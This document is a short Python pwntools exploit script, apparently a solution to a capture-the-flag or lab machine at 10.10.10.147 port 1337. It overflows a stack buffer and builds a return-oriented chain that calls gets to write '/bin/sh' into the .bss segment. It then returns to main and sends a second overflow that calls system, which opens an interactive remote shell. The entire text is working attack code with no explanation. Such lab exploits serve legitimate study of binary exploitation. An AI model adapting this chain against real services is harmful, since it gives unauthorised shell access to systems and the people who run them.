from pwn import *

pwnable = remote("10.10.10.147", 1337)

pwnable.recvline()

payload = ""
payload += "A" * int("0x70", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40120b)                # pop rdi; ret;
payload += p64(0x404048)                # rdi | .bss segment 
payload += p64(0x401060)                # ret | gets@plt
payload += p64(0x40115f)                # main <+0>

pwnable.sendline(payload)

shell = "/bin/sh"
pwnable.sendline(shell + "\x00"*(8-(len(shell)%8)))

pwnable.recvline()

payload = ""
payload += "A" * int("0x70", 16)	# OFFSET
payload += "B" * 8			# BASE POINTER
payload += p64(0x40120b)                # pop rdi; ret;
payload += p64(0x404048)                # rdi | .bss segment
payload += p64(0x401040)                # ret | system@plt

pwnable.sendline(payload)
pwnable.interactive()
